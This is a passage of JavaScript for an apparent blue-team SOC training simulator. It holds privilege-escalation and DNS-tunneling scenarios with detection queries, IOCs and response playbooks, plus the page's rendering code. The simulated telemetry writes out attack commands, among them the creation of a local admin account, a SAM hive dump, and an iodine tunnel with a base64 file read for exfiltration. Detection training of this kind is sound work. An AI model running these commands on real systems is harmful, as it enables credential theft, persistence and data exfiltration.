            severity: 'High',
            host: 'WS-DEV-031',
            user: 'dev.contractor',
            srcIp: '10.0.12.31',
            status: 'Active',
            technique: 'T1068',
        },
        caseInfo: {
            id: 'SOC-2026-0052',
            status: 'Open',
            analyst: 'Analyst-4 (Tier 2)',
            priority: 'P2 — High',
        },
        summary: 'Developer contractor account dev.contractor on WS-DEV-031 exploited a vulnerable Windows service (unquoted service path in LegacyAppSvc) to achieve SYSTEM-level privilege escalation. Post-escalation, the attacker created a new local admin account "support_admin", dumped SAM database hashes, and established persistence via a WMI event subscription.',
        mitre: [
            { technique: 'T1068', name: 'Exploitation for Privilege Escalation', tactic: 'Privilege Escalation' },
            { technique: 'T1574.009', name: 'Hijack Execution Flow: Unquoted Service Path', tactic: 'Persistence' },
            { technique: 'T1136.001', name: 'Create Account: Local Account', tactic: 'Persistence' },
            { technique: 'T1003.002', name: 'OS Credential Dumping: SAM', tactic: 'Credential Access' },
        ],
        siem: {
            sources: ['Windows Security (4688, 4720, 4732)', 'Sysmon (Event 1, 13, 19)', 'Windows System (7045)'],
            logic: 'Detect non-admin user spawning process as SYSTEM via service exploitation, followed by net user /add or SAM registry access within 5-minute window.',
            splunk: `index=windows
(EventCode=4688 TokenElevationType="%%1937" SubjectUserName!="SYSTEM"
  SubjectUserName!="LOCAL SERVICE")
OR (EventCode=4720 TargetUserName="support_admin")
OR (EventCode=7045 ServiceName="LegacyAppSvc")
OR (EventCode=4688 CommandLine="*reg*save*sam*")
| stats values(EventCode) as events, values(CommandLine) as cmds by Computer, SubjectUserName
| where mvcount(events) >= 2
| table _time Computer SubjectUserName events cmds`,
            kql: `union
  (SecurityEvent | where EventID == 4688
    and TokenElevationType == "%%1937"
    and SubjectUserName !in ("SYSTEM","LOCAL SERVICE")),
  (SecurityEvent | where EventID == 4720
    and TargetUserName == "support_admin"),
  (DeviceProcessEvents | where ProcessCommandLine has_all ("reg","save","sam"))
| project Timestamp, Computer, SubjectUserName, EventID, ProcessCommandLine
| sort by Timestamp asc`,
        },
        edr: {
            process: [
                'sc.exe query LegacyAppSvc — enumerated vulnerable service',
                'Planted malicious binary in unquoted service path',
                'Service restarted — SYSTEM shell obtained via hijack',
                'net.exe user support_admin P@ss123! /add — local admin created',
                'reg.exe save HKLM\\SAM C:\\Temp\\sam.save — SAM dump',
            ],
            cmdline: [
                'sc.exe qc LegacyAppSvc (ImagePath: C:\\Program Files\\Legacy App\\Service.exe — unquoted)',
                'copy payload.exe "C:\\Program Files\\Legacy.exe"',
                'sc.exe stop LegacyAppSvc && sc.exe start LegacyAppSvc',
                'net user support_admin P@ss123! /add && net localgroup Administrators support_admin /add',
                'reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\sys.save',
            ],
            parentChild: [
                { parent: 'cmd.exe (dev.contractor)', child: 'sc.exe', note: 'Service enumeration' },
                { parent: 'services.exe (SYSTEM)', child: 'Legacy.exe', note: 'Hijacked service execution' },
                { parent: 'Legacy.exe (SYSTEM)', child: 'cmd.exe', note: 'SYSTEM shell obtained' },
                { parent: 'cmd.exe (SYSTEM)', child: 'net.exe', note: 'Admin account creation' },
            ],
            ioa: [
                { pattern: 'Non-Admin User Gaining SYSTEM via Service Exploit', severity: 'Critical', action: 'Prevent + Kill' },
                { pattern: 'Local Admin Account Creation by Non-Admin', severity: 'High', action: 'Detect + Alert' },
                { pattern: 'SAM Registry Hive Export', severity: 'Critical', action: 'Prevent + Kill' },
            ],
            ioc: {
                ips: ['10.0.12.31 (source workstation)'],
                domains: ['N/A — Local exploitation, no external C2'],
                hashes: ['c3d4e5f6...a7b8c9d0 (Legacy.exe — malicious payload)', '1a2b3c4d...e5f6a7b8 (payload.exe — original dropper)'],
                paths: ['C:\\Program Files\\Legacy.exe', 'C:\\Temp\\sam.save', 'C:\\Temp\\sys.save', 'C:\\Users\\dev.contractor\\payload.exe'],
            },
        },
        xdr: {
            identity: 'dev.contractor — External contractor, standard user, no admin rights, dev workstation only',
            endpoint: 'WS-DEV-031 — Developer workstation, SYSTEM escalation achieved, SAM dumped, new admin created',
            network: 'No external C2 — local privilege escalation only (lateral movement likely next)',
            chain: [
                { stage: 'Discovery', detail: 'Enumerated services — found unquoted path in LegacyAppSvc', status: 'confirmed' },
                { stage: 'Privilege Escalation', detail: 'Exploited unquoted service path → SYSTEM shell', status: 'confirmed' },
                { stage: 'Persistence', detail: 'Created local admin support_admin + WMI subscription', status: 'active' },
                { stage: 'Credential Access', detail: 'SAM/SYSTEM hive dumped for offline cracking', status: 'active' },
            ],
        },
        timeline: [
            { time: '2026-04-03 16:05:00', event: 'dev.contractor logged into WS-DEV-031 (standard user session)', type: 'info' },
            { time: '2026-04-03 16:12:30', event: 'sc.exe qc LegacyAppSvc — service path enumeration', type: 'suspicious' },
            { time: '2026-04-03 16:14:00', event: 'Malicious Legacy.exe placed in C:\\Program Files\\', type: 'critical' },
            { time: '2026-04-03 16:14:45', event: 'LegacyAppSvc restarted — SYSTEM shell obtained', type: 'critical' },
            { time: '2026-04-03 16:15:20', event: 'net user support_admin created and added to Administrators', type: 'critical' },
            { time: '2026-04-03 16:16:05', event: 'reg save HKLM\\SAM and HKLM\\SYSTEM exported to C:\\Temp\\', type: 'critical' },
        ],
        logs: [
            { id: 1, text: '[16:05:00] EventID 4624 — Logon: dev.contractor (Type 2 Interactive)', type: 'normal' },
            { id: 2, text: '[16:12:30] EventID 4688 — Process: sc.exe "qc LegacyAppSvc" by dev.contractor', type: 'suspicious' },
            { id: 3, text: '[16:14:00] Sysmon 11 — FileCreate: C:\\Program Files\\Legacy.exe (unsigned)', type: 'critical' },
            { id: 4, text: '[16:14:45] EventID 7045 — Service Installed: LegacyAppSvc restarted (SYSTEM)', type: 'critical' },
            { id: 5, text: '[16:15:20] EventID 4720 — User Account Created: support_admin by SYSTEM', type: 'critical' },
            { id: 6, text: '[16:15:25] EventID 4732 — Member Added to Administrators: support_admin', type: 'critical' },
            { id: 7, text: '[16:16:05] EventID 4688 — Process: reg.exe "save HKLM\\SAM C:\\Temp\\sam.save"', type: 'critical' },
            { id: 8, text: '[16:16:10] Sysmon 13 — RegistryValueSet: WMI EventSubscription persistence', type: 'suspicious' },
        ],
        soar: {
            trigger: 'Non-admin user achieving SYSTEM token + local admin account creation within 5-minute window',
            actions: [
                { action: 'Isolate WS-DEV-031 from network', type: 'isolate', status: 'pending' },
                { action: 'Kill SYSTEM cmd.exe shell process', type: 'kill', status: 'pending' },
                { action: 'Delete local account support_admin', type: 'disable', status: 'pending' },
                { action: 'Disable dev.contractor AD account', type: 'disable', status: 'pending' },
                { action: 'Remove WMI persistence subscription', type: 'kill', status: 'pending' },
            ],
        },
        detection: {
            threshold: 'Non-admin → SYSTEM token elevation + net user /add within 5 minutes',
            timeWindow: '5-minute correlation window',
        },
        falsePositives: [
            'Software installer running as SYSTEM during scheduled deployment (correlate with SCCM)',
            'Admin using runas /user:SYSTEM for troubleshooting (verify via ticketing system)',
            'Group Policy applying service configurations (whitelist GP engine processes)',
        ],
        tuning: [
            'Whitelist known installers and SCCM task sequences by parent process + hash',
            'Add unquoted service path detection as a proactive vulnerability scanner',
            'Correlate with HR database — flag if contractor account performs admin-level actions',
            'Alert on any net user /add regardless of privilege level in sensitive segments',
        ],
        risk: { score: 88, confidence: 'High' },
    },
    'dns-tunneling': {
        alert: {
            rule: 'DNS Tunneling — High-Frequency Encoded Queries',
            severity: 'High',
            host: 'WS-PC089',
            user: 'contractor_01',
            srcIp: '10.0.5.89',
            status: 'Active',
            technique: 'T1572',
        },
        caseInfo: {
            id: 'SOC-2026-0049',
            status: 'Open',
            analyst: 'Analyst-2 (Tier 2)',
            priority: 'P2 — High',
        },
        summary: 'Endpoint WS-PC089 is generating high-frequency DNS TXT queries to xf7k2.datacache[.]cloud with base64-encoded subdomains. Pattern matches iodine/dnscat2 tunneling signatures. Estimated 2.4 MB exfiltrated over 45 minutes via DNS channel. Contractor account contractor_01 is the active user.',
        mitre: [
            { technique: 'T1572', name: 'Protocol Tunneling', tactic: 'Command and Control' },
            { technique: 'T1048.001', name: 'Exfiltration Over Alternative Protocol: DNS', tactic: 'Exfiltration' },
            { technique: 'T1071.004', name: 'Application Layer Protocol: DNS', tactic: 'Command and Control' },
            { technique: 'T1132.001', name: 'Data Encoding: Standard Encoding', tactic: 'Command and Control' },
        ],
        siem: {
            sources: ['DNS Server Logs', 'Sysmon (Event 22 — DNS Query)', 'Network Flow / Zeek dns.log'],
            logic: 'Detect endpoints generating > 500 DNS queries/hour to a single domain, OR subdomain labels > 50 chars (base64 pattern), OR high ratio of TXT/NULL query types.',
            splunk: `index=dns sourcetype=stream:dns
| eval subdomain_len = len(mvindex(split(query,"."),0))
| where query_type IN ("TXT","NULL") AND subdomain_len > 50
| stats count as query_count dc(query) as unique_queries by src_ip, query_type,
        answer_type, mvindex(split(query,"."),-2)
| where query_count > 500
| eval est_data_mb = round(query_count * 200 / 1048576, 2)
| table _time src_ip query_count unique_queries est_data_mb`,
            kql: `DnsEvents
| where QueryType in ("TXT","NULL")
| extend SubdomainLength = strlen(tostring(split(Name, ".")[0]))
| where SubdomainLength > 50
| summarize QueryCount = count(), UniqueQueries = dcount(Name)
    by ClientIP, QueryType, bin(TimeGenerated, 1h)
| where QueryCount > 500
| extend EstDataMB = round(QueryCount * 200.0 / 1048576, 2)`,
        },
        edr: {
            process: [
                'iodine.exe running as background process (PID 5412)',
                'dns.exe receiving abnormally large TXT responses',
                'powershell.exe script encoding data to base64 subdomain format',
                'Outbound DNS traffic bypassing corporate DNS resolver',
            ],
            cmdline: [
                'iodine.exe -f -r xf7k2.datacache[.]cloud 10.0.5.89',
                'powershell.exe -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'C:\\Sensitive\\data.xlsx\'))"',
                'nslookup -type=TXT <base64_chunk>.xf7k2.datacache[.]cloud',
            ],
            parentChild: [
                { parent: 'explorer.exe', child: 'powershell.exe', note: 'User-initiated script' },
                { parent: 'powershell.exe', child: 'iodine.exe', note: 'DNS tunnel client launched' },
                { parent: 'iodine.exe', child: 'dns queries', note: 'Continuous DNS exfil stream' },
            ],
            ioa: [
                { pattern: 'DNS Query Rate > 500/hr to Single Domain', severity: 'High', action: 'Detect + Alert' },
                { pattern: 'Base64 Encoded DNS Subdomain Labels', severity: 'High', action: 'Detect + Alert' },
                { pattern: 'Known DNS Tunnel Tool Execution', severity: 'Critical', action: 'Prevent + Kill' },
            ],
            ioc: {
                ips: ['10.0.5.89 (source)', '198.51.100.15 (tunnel server)'],
                domains: ['xf7k2.datacache[.]cloud', 'ns1.datacache[.]cloud'],
                hashes: ['b4c8d2e1...f7a3c5b9 (iodine.exe)'],
                paths: ['C:\\Users\\contractor_01\\AppData\\Local\\Temp\\iodine.exe', 'C:\\Sensitive\\data.xlsx'],
            },
        },
        xdr: {
            identity: 'contractor_01 — External contractor, limited access, no admin rights, VPN-connected',
            endpoint: 'WS-PC089 — Workstation, iodine.exe running, 2.4 MB DNS exfil estimated',
            network: '12,847 DNS TXT queries to xf7k2.datacache[.]cloud in 45 minutes',
            chain: [
                { stage: 'Initial Access', detail: 'Contractor VPN access — valid credentials, no anomaly', status: 'confirmed' },
                { stage: 'Collection', detail: 'Sensitive files staged from C:\\Sensitive\\ directory', status: 'confirmed' },
                { stage: 'C2 Channel', detail: 'DNS tunnel established via iodine to datacache[.]cloud', status: 'active' },
                { stage: 'Exfiltration', detail: '~2.4 MB exfiltrated via DNS TXT query encoding', status: 'active' },
            ],
        },
        timeline: [
            { time: '2026-04-03 11:05:00', event: 'contractor_01 connected via VPN from external IP', type: 'info' },
            { time: '2026-04-03 11:22:30', event: 'PowerShell script executed — base64 encoding files from C:\\Sensitive\\', type: 'suspicious' },
            { time: '2026-04-03 11:23:15', event: 'iodine.exe launched — DNS tunnel client started', type: 'critical' },
            { time: '2026-04-03 11:23:20', event: 'DNS TXT queries to xf7k2.datacache[.]cloud begin (>500/hr rate)', type: 'critical' },
            { time: '2026-04-03 11:45:00', event: 'Estimated 1.2 MB exfiltrated via DNS channel', type: 'suspicious' },
            { time: '2026-04-03 12:08:00', event: 'Cumulative 2.4 MB exfiltrated — alert triggered by SIEM', type: 'critical' },
        ],
        logs: [
            { id: 1, text: '[11:05:00] VPN — contractor_01 connected from 82.45.192.33 (ISP: BT Group)', type: 'normal' },
            { id: 2, text: '[11:22:30] EventID 4104 — ScriptBlock: [Convert]::ToBase64String([IO.File]::ReadAllBytes(...))', type: 'suspicious' },
            { id: 3, text: '[11:23:15] Sysmon 1 — ProcessCreate: iodine.exe (PID 5412) by powershell.exe', type: 'critical' },
            { id: 4, text: '[11:23:20] DNS — TXT query: bGlnaHRzIG9u...ZGF0YQ==.xf7k2.datacache[.]cloud', type: 'critical' },
            { id: 5, text: '[11:30:00] DNS — 3,241 queries to datacache[.]cloud in 7 minutes (avg subdomain len: 63)', type: 'critical' },
            { id: 6, text: '[11:45:00] Zeek dns.log — Anomaly: TXT query ratio 94% for datacache[.]cloud', type: 'suspicious' },
            { id: 7, text: '[12:08:00] SIEM Correlation — DNS tunneling pattern confirmed, est. 2.4 MB exfil', type: 'critical' },
            { id: 8, text: '[12:08:05] Threat Intel — datacache[.]cloud registered 48 hours ago (DGA pattern)', type: 'suspicious' },
        ],
        soar: {
            trigger: '> 500 DNS queries/hr to single domain with subdomain label length > 50 characters',
            actions: [
                { action: 'Block domain datacache[.]cloud at DNS resolver', type: 'block', status: 'pending' },
                { action: 'Kill process iodine.exe (PID 5412) on WS-PC089', type: 'kill', status: 'pending' },
                { action: 'Isolate WS-PC089 from network', type: 'isolate', status: 'pending' },
                { action: 'Revoke contractor_01 VPN access', type: 'disable', status: 'pending' },
            ],
        },
        detection: {
            threshold: '> 500 DNS queries/hour to single domain with encoded subdomain labels (>50 chars)',
            timeWindow: '1-hour rolling window',
        },
        falsePositives: [
            'CDN subdomains with long hashed names (akamai, cloudfront — whitelist)',
            'DKIM/SPF DNS lookups with long TXT records (exclude mail server IPs)',
            'Anti-malware cloud lookups with encoded file hashes (whitelist vendor domains)',
            'Legitimate DNS-based service discovery in microservices (internal domains only)',
        ],
        tuning: [
            'Whitelist known CDN and cloud provider domains (akamai, cloudfront, azure)',
            'Reduce threshold to 200/hr if monitoring sensitive segments',
            'Add Shannon entropy calculation — alert only if entropy > 3.5 per subdomain',
            'Correlate with DLP alerts for data staging activity pre-DNS exfil',
        ],
        risk: { score: 78, confidence: 'High' },
    },
};

// ── Render the full SOC Workflow Simulator ──
function loadSOCWorkflow() {
    document.getElementById('dashboard').classList.add('hidden');
    const content = document.getElementById('page-content');
    content.classList.remove('hidden');
    content.scrollTop = 0;

    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebar-overlay');
    if (sidebar) sidebar.classList.remove('sidebar-open');
    if (overlay) overlay.classList.remove('active');

    content.innerHTML = `
    <style>
        .sw-container { max-width:1200px; margin:0 auto; padding:24px; }
        .sw-header { margin-bottom:24px; }
        .sw-header h1 { font-size:22px; font-weight:800; margin:0 0 6px; display:flex; align-items:center; gap:12px; }
        .sw-header p { color:var(--text-secondary); font-size:13px; margin:0; }
        .sw-tag { font-size:10px; padding:4px 12px; border-radius:20px; font-weight:700; letter-spacing:0.5px; }
        .sw-tag-blue { background:rgba(34,211,238,0.12); color:#22d3ee; }
        .sw-tag-red { background:rgba(239,68,68,0.12); color:#ef4444; }
        .sw-tag-green { background:rgba(34,197,94,0.12); color:#22c55e; }
        .sw-tag-orange { background:rgba(245,158,11,0.12); color:#f59e0b; }

        .sw-scenario-bar { display:flex; gap:8px; margin-bottom:24px; flex-wrap:wrap; }
        .sw-scenario-btn {
            padding:10px 20px; border:1px solid var(--border); border-radius:8px;
            background:var(--bg-card); color:var(--text-secondary); font-size:13px;
            font-weight:600; cursor:pointer; transition:all 0.15s; font-family:inherit;
        }
        .sw-scenario-btn:hover { border-color:var(--accent); color:var(--accent); }
        .sw-scenario-btn.active { background:rgba(34,211,238,0.1); border-color:#22d3ee; color:#22d3ee; }

        .sw-section {
            background:var(--bg-card); border:1px solid var(--border); border-radius:10px;
            margin-bottom:16px; overflow:hidden;
        }
        .sw-section-head {
            padding:14px 20px; display:flex; align-items:center; justify-content:space-between;
            border-bottom:1px solid var(--border); cursor:pointer; transition:background 0.15s;
        }
        .sw-section-head:hover { background:rgba(255,255,255,0.02); }
        .sw-section-title { font-size:14px; font-weight:700; display:flex; align-items:center; gap:10px; }
        .sw-section-num {
            width:26px; height:26px; border-radius:6px; display:flex; align-items:center;
            justify-content:center; font-size:11px; font-weight:800; background:rgba(34,211,238,0.1);
            color:#22d3ee; flex-shrink:0;
        }
        .sw-section-body { padding:16px 20px; }
        .sw-section-body.collapsed { display:none; }
        .sw-chevron { color:var(--text-muted); font-size:12px; transition:transform 0.2s; }
        .sw-chevron.open { transform:rotate(90deg); }

        .sw-grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
        .sw-grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; }
        .sw-field { margin-bottom:10px; }
        .sw-label { font-size:10px; text-transform:uppercase; letter-spacing:0.8px; color:var(--text-muted); font-weight:700; margin-bottom:4px; }
        .sw-value { font-size:13px; color:var(--text-primary); font-weight:500; }
        .sw-value-mono { font-family:var(--font-mono); font-size:12px; color:#22d3ee; }

        .sw-sev { display:inline-block; padding:3px 12px; border-radius:20px; font-size:11px; font-weight:700; letter-spacing:0.3px; }
        .sw-sev-critical { background:rgba(239,68,68,0.12); color:#ef4444; }
        .sw-sev-high { background:rgba(245,158,11,0.12); color:#f59e0b; }
        .sw-sev-medium { background:rgba(34,211,238,0.12); color:#22d3ee; }

        .sw-summary { font-size:13px; color:var(--text-secondary); line-height:1.7; }

        .sw-mitre-table { width:100%; border-collapse:collapse; font-size:13px; }
        .sw-mitre-table th { text-align:left; padding:10px 14px; font-size:10px; text-transform:uppercase; letter-spacing:0.8px; color:var(--text-muted); font-weight:700; border-bottom:1px solid var(--border); }
        .sw-mitre-table td { padding:10px 14px; border-bottom:1px solid rgba(255,255,255,0.04); }
        .sw-mitre-table tr:last-child td { border-bottom:none; }
        .sw-mitre-id { font-family:var(--font-mono); color:#22d3ee; font-weight:600; font-size:12px; }
        .sw-mitre-name { color:var(--text-primary); }
        .sw-mitre-tactic { font-size:11px; padding:3px 10px; border-radius:20px; background:rgba(99,102,241,0.12); color:#818cf8; font-weight:600; }

        .sw-code-block {
            background:#0d1117; border:1px solid var(--border); border-radius:8px;
            padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.6;
            color:#c9d1d9; overflow-x:auto; white-space:pre; margin-top:8px;
            max-height:220px; overflow-y:auto;
        }
        .sw-code-label { font-size:11px; font-weight:700; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; margin-bottom:4px; margin-top:12px; }
        .sw-code-label:first-child { margin-top:0; }

        .sw-edr-list { list-style:none; padding:0; }
        .sw-edr-list li { padding:8px 0; font-size:13px; color:var(--text-secondary); display:flex; align-items:flex-start; gap:10px; }
        .sw-edr-list li::before { content:'▸'; color:#22d3ee; font-weight:bold; flex-shrink:0; }

        .sw-pc-row { display:flex; align-items:center; gap:8px; padding:8px 0; font-size:13px; border-bottom:1px solid rgba(255,255,255,0.03); }
        .sw-pc-row:last-child { border-bottom:none; }
        .sw-pc-parent { color:var(--text-muted); font-family:var(--font-mono); font-size:12px; }
        .sw-pc-arrow { color:#22d3ee; font-size:14px; }
        .sw-pc-child { color:var(--text-primary); font-family:var(--font-mono); font-size:12px; font-weight:600; }
        .sw-pc-note { color:var(--text-muted); font-size:11px; margin-left:8px; font-style:italic; }

        .sw-ioa-card, .sw-ioc-card {
            background:rgba(255,255,255,0.02); border:1px solid var(--border); border-radius:8px;
            padding:12px 16px; margin-bottom:8px;
        }
        .sw-ioa-pattern { font-size:13px; font-weight:600; color:var(--text-primary); margin-bottom:6px; }
        .sw-ioa-meta { display:flex; gap:10px; font-size:11px; }
        .sw-ioc-type { font-size:10px; text-transform:uppercase; letter-spacing:0.6px; color:var(--text-muted); font-weight:700; margin-bottom:4px; }
        .sw-ioc-values { font-family:var(--font-mono); font-size:12px; color:#c9d1d9; }
        .sw-ioc-values div { padding:3px 0; }

        .sw-xdr-cards { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; margin-bottom:16px; }
        .sw-xdr-card { background:rgba(255,255,255,0.02); border:1px solid var(--border); border-radius:8px; padding:14px; }
        .sw-xdr-card-title { font-size:10px; text-transform:uppercase; letter-spacing:0.8px; color:var(--text-muted); font-weight:700; margin-bottom:6px; }
        .sw-xdr-card-value { font-size:12px; color:var(--text-secondary); line-height:1.5; }

        .sw-chain { display:flex; align-items:center; gap:0; overflow-x:auto; padding:8px 0; }
        .sw-chain-stage {
            padding:12px 16px; border:1px solid var(--border); border-radius:8px;
            min-width:160px; text-align:center; flex-shrink:0;
        }
        .sw-chain-stage.confirmed { border-color:rgba(239,68,68,0.4); background:rgba(239,68,68,0.05); }
        .sw-chain-stage.active { border-color:rgba(245,158,11,0.4); background:rgba(245,158,11,0.05); box-shadow:0 0 12px rgba(245,158,11,0.1); }
        .sw-chain-stage.pending { border-color:var(--border); opacity:0.6; }
        .sw-chain-label { font-size:12px; font-weight:700; margin-bottom:4px; }
        .sw-chain-detail { font-size:11px; color:var(--text-muted); line-height:1.4; }
        .sw-chain-arrow { flex-shrink:0; padding:0 6px; color:#22d3ee; font-size:16px; }

        .sw-timeline { position:relative; padding-left:24px; }
        .sw-tl-event { position:relative; padding:10px 0 10px 20px; border-left:2px solid var(--border); }
        .sw-tl-event::before {
            content:''; position:absolute; left:-6px; top:14px; width:10px; height:10px;
            border-radius:50%; background:var(--border);
        }
        .sw-tl-event.info::before { background:#64748b; }
        .sw-tl-event.suspicious::before { background:#f59e0b; box-shadow:0 0 8px rgba(245,158,11,0.4); }
        .sw-tl-event.critical::before { background:#ef4444; box-shadow:0 0 8px rgba(239,68,68,0.4); }
        .sw-tl-time { font-family:var(--font-mono); font-size:11px; color:var(--text-muted); }
        .sw-tl-desc { font-size:13px; color:var(--text-secondary); margin-top:2px; }
        .sw-tl-event.suspicious .sw-tl-desc { color:#f59e0b; }
        .sw-tl-event.critical .sw-tl-desc { color:#ef4444; }

        .sw-log { font-family:var(--font-mono); font-size:12px; padding:4px 12px; border-radius:4px; margin-bottom:2px; display:flex; gap:12px; }
        .sw-log:hover { background:rgba(255,255,255,0.03); }
        .sw-log-num { color:var(--text-muted); width:24px; flex-shrink:0; user-select:none; }
        .sw-log.normal .sw-log-text { color:var(--text-muted); }
        .sw-log.suspicious .sw-log-text { color:#f59e0b; }
        .sw-log.critical .sw-log-text { color:#ef4444; font-weight:600; }
        .sw-log.suspicious, .sw-log.critical { background:rgba(239,68,68,0.03); }

        .sw-soar-trigger { background:rgba(34,211,238,0.06); border:1px solid rgba(34,211,238,0.15); border-radius:8px; padding:12px 16px; font-size:13px; color:#22d3ee; margin-bottom:14px; font-family:var(--font-mono); }
        .sw-soar-action {
            display:flex; align-items:center; justify-content:space-between; padding:12px 16px;
            border-radius:8px; margin-bottom:6px; background:rgba(255,255,255,0.02);
            border:1px solid var(--border); transition:all 0.2s;
        }
        .sw-soar-action.done { opacity:0.7; }
        .sw-soar-action-text { font-size:13px; color:var(--text-secondary); }
        .sw-soar-btn {
            padding:6px 16px; border-radius:6px; border:1px solid var(--border);
            background:var(--bg-tertiary); color:var(--text-secondary); font-size:12px;
            font-weight:600; cursor:pointer; transition:all 0.15s; font-family:inherit;
        }
        .sw-soar-btn:hover { border-color:#22d3ee; color:#22d3ee; }
        .sw-soar-btn.danger { border-color:rgba(239,68,68,0.3); color:#ef4444; }
        .sw-soar-btn.danger:hover { background:rgba(239,68,68,0.1); border-color:#ef4444; }
        .sw-soar-done { color:#22c55e; font-size:13px; font-weight:600; }

        .sw-status-row { display:flex; align-items:center; gap:10px; padding:8px 0; font-size:13px; }
        .sw-status-check { color:#22c55e; font-weight:700; }
        .sw-status-pending { color:var(--text-muted); }

        .sw-risk-bar { display:flex; align-items:center; gap:16px; margin-top:8px; }
        .sw-risk-score {
            font-size:40px; font-weight:800; font-family:var(--font-mono); line-height:1;
        }
        .sw-risk-score.high { color:#ef4444; text-shadow:0 0 20px rgba(239,68,68,0.3); }
        .sw-risk-score.medium { color:#f59e0b; }
        .sw-risk-meter { flex:1; height:8px; background:var(--bg-tertiary); border-radius:4px; overflow:hidden; }
        .sw-risk-fill { height:100%; border-radius:4px; transition:width 0.8s ease; }

        .sw-fp-list, .sw-tuning-list { list-style:none; padding:0; }
        .sw-fp-list li, .sw-tuning-list li { padding:6px 0; font-size:13px; color:var(--text-secondary); display:flex; gap:8px; }
        .sw-fp-list li::before { content:'⚠'; flex-shrink:0; }
        .sw-tuning-list li::before { content:'▸'; color:#22d3ee; flex-shrink:0; }

        .sw-exec-all {
            margin-top:16px; padding:12px 28px; border:none; border-radius:8px;
            background:linear-gradient(135deg,#22d3ee,#6366f1); color:#fff;
            font-size:14px; font-weight:700; cursor:pointer; font-family:inherit;
            transition:all 0.2s; box-shadow:0 4px 15px rgba(34,211,238,0.25);
        }
        .sw-exec-all:hover { transform:translateY(-1px); box-shadow:0 6px 25px rgba(34,211,238,0.35); }
        .sw-exec-all:disabled { opacity:0.5; cursor:not-allowed; transform:none; }

        .sw-view-toggle { display:flex; gap:8px; margin-bottom:20px; }
        .sw-view-btn {
            padding:8px 18px; border:1px solid var(--border); border-radius:6px;
            background:var(--bg-card); color:var(--text-secondary); font-size:12px;
            font-weight:600; cursor:pointer; font-family:inherit; transition:all 0.15s;
        }
        .sw-view-btn:hover { border-color:var(--accent); color:var(--accent); }
        .sw-view-btn.active { background:rgba(34,211,238,0.1); border-color:#22d3ee; color:#22d3ee; }
        .sw-json-view {
            background:#0d1117; border:1px solid var(--border); border-radius:10px;
            padding:20px; font-family:var(--font-mono); font-size:12px; line-height:1.6;
            color:#c9d1d9; overflow:auto; max-height:75vh; white-space:pre; position:relative;
        }
        .sw-json-copy {
            position:sticky; top:0; float:right; padding:6px 14px; border:1px solid var(--border);
            border-radius:6px; background:rgba(17,24,39,0.95); color:#22d3ee; font-size:11px;
            font-weight:700; cursor:pointer; font-family:inherit; transition:all 0.15s; z-index:2;
        }
        .sw-json-copy:hover { background:#22d3ee; color:#0d1117; }
        .sw-json-key { color:#7ee787; }
        .sw-json-str { color:#a5d6ff; }
        .sw-json-num { color:#f8a4b8; }
        .sw-json-bool { color:#ff7b72; }
        .sw-json-null { color:#6e7681; }

        @media (max-width:768px) {
            .sw-grid-2, .sw-grid-3, .sw-xdr-cards { grid-template-columns:1fr; }
            .sw-chain { flex-direction:column; }
            .sw-chain-arrow { transform:rotate(90deg); }
        }
    </style>

    <div class="sw-container">
        <div style="margin-bottom:20px">
            <button class="btn-hack" onclick="goHome()">&#9666; BACK TO DASHBOARD</button>
        </div>

        <div class="sw-header">
            <h1>
                SOC Workflow Simulator
                <span class="sw-tag sw-tag-blue">BLUE TEAM</span>
                <span class="sw-tag sw-tag-red">SIMULATED</span>
            </h1>
            <p>Full Detection → Alert → Case → Investigation → Response pipeline simulation</p>
        </div>

        <div class="sw-scenario-bar" id="sw-scenario-bar">
            <button class="sw-scenario-btn active" onclick="swLoadScenario('credential-dumping')">Credential Dumping (LSASS)</button>
            <button class="sw-scenario-btn" onclick="swLoadScenario('brute-force-rdp')">RDP Brute Force</button>
            <button class="sw-scenario-btn" onclick="swLoadScenario('ransomware-execution')">Ransomware (LockBit)</button>
            <button class="sw-scenario-btn" onclick="swLoadScenario('phishing-c2')">Phishing C2 Callback</button>
            <button class="sw-scenario-btn" onclick="swLoadScenario('privilege-escalation')">Privilege Escalation</button>
            <button class="sw-scenario-btn" onclick="swLoadScenario('dns-tunneling')">DNS Tunneling (Exfil)</button>
        </div>

        <div class="sw-view-toggle">
            <button class="sw-view-btn active" id="sw-view-ui" onclick="swSwitchView('ui')">Dashboard View</button>
            <button class="sw-view-btn" id="sw-view-json" onclick="swSwitchView('json')">JSON Export</button>
        </div>

        <div id="sw-workflow-body"></div>
        <div id="sw-json-body" style="display:none"></div>
    </div>
    `;

    swLoadScenario('credential-dumping');
}

function swLoadScenario(id) {
    const s = socScenarios[id];
    if (!s) return;

    // Update active button
    document.querySelectorAll('.sw-scenario-btn').forEach(b => b.classList.remove('active'));
    document.querySelector(`.sw-scenario-btn[onclick*="${id}"]`)?.classList.add('active');

    const sevClass = { Critical: 'sw-sev-critical', High: 'sw-sev-high', Medium: 'sw-sev-medium' };

    const body = document.getElementById('sw-workflow-body');
    body.innerHTML = `

    <!-- 1. Alert Details -->
    ${swSection(1, 'Alert Details', `
        <div class="sw-grid-3">
            <div class="sw-field"><div class="sw-label">Rule Name</div><div class="sw-value">${s.alert.rule}</div></div>
            <div class="sw-field"><div class="sw-label">Severity</div><div><span class="sw-sev ${sevClass[s.alert.severity] || ''}">${s.alert.severity}</span></div></div>
            <div class="sw-field"><div class="sw-label">Status</div><div class="sw-value"><span class="sw-tag sw-tag-red">${s.alert.status}</span></div></div>
            <div class="sw-field"><div class="sw-label">Host</div><div class="sw-value-mono">${s.alert.host}</div></div>
            <div class="sw-field"><div class="sw-label">User</div><div class="sw-value-mono">${s.alert.user}</div></div>
            <div class="sw-field"><div class="sw-label">Source IP</div><div class="sw-value-mono">${s.alert.srcIp}</div></div>
        </div>
    `)}

    <!-- 2. Case Details -->
    ${swSection(2, 'Case Details', `
        <div class="sw-grid-2">
            <div class="sw-field"><div class="sw-label">Case ID</div><div class="sw-value-mono">${s.caseInfo.id}</div></div>
